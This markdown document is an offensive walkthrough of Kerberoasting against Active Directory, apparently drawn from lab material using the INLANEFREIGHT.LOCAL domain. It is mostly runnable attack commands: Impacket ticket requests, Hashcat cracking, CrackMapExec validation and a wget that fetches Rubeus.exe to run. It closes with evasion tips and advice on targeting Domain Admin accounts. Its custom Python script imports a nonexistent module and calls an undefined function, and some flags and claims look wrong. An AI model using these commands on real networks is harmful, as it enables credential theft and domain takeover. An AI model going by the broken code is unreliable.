# 🛰️ Kerberoasting Attack Walkthrough

## 🎯 Objective
[!INFO] The goal of a Kerberoasting attack is to request Service Principal Name (SPN) service tickets from Active Directory and crack them offline to obtain plaintext passwords. This technique exploits the weaknesses in how SPNs are managed and used within an organization.

## 🔍 Prerequisites
- Ensure you have administrative or high-privilege access to an account with permission to query Active Directory.
- Install necessary tools: Impacket (including `GetUserSPNs.py`, `secretsdump.py`), Hashcat, Rubeus, CrackMapExec.

## 🚀 Step-by-step Guide

### 🔑 Preparation
[!INFO] Ensure you have a list of domain users and their SPNs. Use enumeration techniques like LDAP queries or existing tooling to gather this information before initiating the Kerberoasting attack.

```bash
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD > tickets.txt
```

### 🏃‍♂️ Ticket Request Phase
[!SUCCESS] Use `GetUserSPNs.py` or equivalent tools to request TGS (Ticket Granting Service) tickets for each SPN identified in the enumeration phase.

#### Example:
```bash
# Basic Kerberoasting with GetUserSPNs
python3 GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD > all_tickets.txt

# Request specific ticket for a single user
python3 GetUserSPNs.py -request-user $USER_NAME -outputfile specific_ticket.txt $DOMAIN/$USERNAME:$PASSWORD
```

### 🔐 Ticket Cracking Phase
[!SUCCESS] Use Hashcat or similar password cracking tools to attempt to crack the tickets obtained.

#### Example:
```bash
# Using Hashcat for cracking
hashcat -m 13100 all_tickets.txt /usr/share/wordlists/rockyou.txt

# Validate cracked hashes with hashcat
hashcat -m 13100 --show all_tickets.txt cracked_hashes.potfile
```

### 🔑 Privilege Escalation and Post-Exploitation
[!SUCCESS] Once you have the plaintext passwords, leverage them for further privilege escalation or lateral movement within the network.

#### Example:
```bash
# Use cracked credentials to validate access
crackmapexec smb $DC_IP -u user_name -p 'password'
```

## 💡 Advanced Techniques

### 📊 Custom Scripts and Automation
[!INFO] Utilize custom Python scripts for more granular control over SPN enumeration, ticket request handling, and credential cracking.

#### Example:
```python
#!/usr/bin/env python3
# Custom Kerberoasting script using ldap3 and impacket

from ldap3 import Server, Connection, ALL, NTLM
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5 import constants
from impacket.kerbtray import getKerberosTGT
import sys

def main():
    dc_ip = '172.16.5.5'
    domain = 'INLANEFREIGHT.LOCAL'
    username = 'forend'
    password = 'Klmcargo2'

    # Establish LDAP connection
    server = Server(dc_ip, get_info=ALL)
    conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)

    # Enumerate SPNs
    search_base = f"DC={',DC='.join(domain.split('.'))}"
    search_filter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))"
    
    conn.search(search_base, search_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
    
    for entry in conn.entries:
        spn = str(entry.servicePrincipalName[0])
        print(f"Requesting ticket for {spn}")
        try:
            tgt, cipher, opts = getKerberosTGT(f"{domain}\\{username}", password)
            tgs = getKerberosTGS(spn, tgt, cipher, opts)
            with open(f'{entry.sAMAccountName.value}_ticket', 'wb') as f:
                f.write(tgs[1])
        except KerberosError as e:
            print(e)

if __name__ == "__main__":
    main()
```

### 🔍 Alternative Tools and Methods

#### 🛠️ **Rubeus via Wine (Linux)**
```bash
# Install Wine
sudo apt install wine

# Download and setup Rubeus
wget https://github.com/GhostPack/Rubeus/releases/download/2.0.2/Rubeus.exe

# Use Rubeus for Kerberoasting
wine Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /dc:172.16.5.5 /creduser:forend /credpassword:Klmcargo2

# Output tickets for Hashcat
wine Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /format:hashcat /outfile:tickets.txt
```

#### 🔧 **CrackMapExec Integration**
```bash
# Kerberoasting with CrackMapExec
crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 --kerberoast kerberoast_output.txt

# Automatic cracking
crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 --kerberoasting kerberoast_output.txt --crack-hashcat /usr/share/wordlists/rockyou.txt
```

## ⚡ Quick Reference Commands

### 🔧 **Essential Kerberoasting Workflow**
```bash
# 1. Basic enumeration
GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS]

# 2. Request all tickets
GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS] -request -outputfile all_tickets.txt

# 3. Request specific ticket
GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS] -request-user [TARGET_USER] -outputfile target_ticket.txt

# 4. Crack tickets
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt

# 5. Validate credentials
crackmapexec smb [DC_IP] -u [CRACKED_USER] -p '[CRACKED_PASS]'
```

### 📊 **Common SPN Patterns**
| **Service** | **SPN Format** | **Common Ports** |
|-------------|----------------|------------------|
| **MSSQL**  | `MSSQLSvc/server.domain.com:1433`      | 1433, 1434          |
| **HTTP**   | `HTTP/server.domain.com`                | 80, 443, 8080       |
| **LDAP**   | `ldap/server.domain.com`                | 389, 636, 3268      |
| **CIFS/SMB| `cifs/server.domain.com`                 | 445, 139            |
| **WinRM**  | `WSMAN/server.domain.com`               | 5985, 5986          |
| **Exchange| `exchangeMDB/server.domain.com`          | 135, 993, 995       |
| **Terminal Services**   | `TERMSRV/server.domain.com`    | 3389                |

---

## 🔑 Key Takeaways

### ✅ **Attack Success Factors**
- **Weak Passwords**: Service accounts with dictionary or predictable passwords.
- **High Privileges**: Accounts with Domain Admin or local admin rights.
- **Multiple SPNs**: Users with several service registrations increase attack surface.
- **Legacy Systems**: Older environments often have weaker service account security.

### 🎯 **Target Prioritization**
1. **Domain Admins**: Highest priority - immediate domain compromise.
2. **Service Admins**: Accounts with admin rights on multiple systems.
3. **Database Services**: Often have elevated privileges (MSSQL, Oracle, SAP).
4. **Exchange Services**: May have high privileges in Exchange environments.
5. **Backup Services**: Often have backup operator rights.

### ⚠️ **Detection and Evasion**
- **Unusual TGS Requests**: Large numbers of ticket requests may trigger alerts.
- **Service Account Monitoring**: Some orgs monitor service account authentication.
- **Behavioral Analysis**: Rapid successive ticket requests are suspicious.
- **Time-based Attacks**: Spread requests over time to avoid detection.
- **Legitimate SPNs**: Focus on real service accounts rather than user accounts with SPNs.

### 🚀 **Post-Exploitation Opportunities**
- **SQL Server Access**: Use cracked MSSQL service accounts for `xp_cmdshell`.
- **Service Impersonation**: Create service tickets for the compromised SPN.
- **Privilege Escalation**: Use high-privilege service accounts for lateral movement.
- **Persistence**: Service accounts often don't change passwords frequently.

---

*Kerberoasting remains one of the most effective Active Directory attack techniques - by targeting the intersection of service requirements and administrative convenience, it often provides a direct path to high-privilege access in enterprise environments.*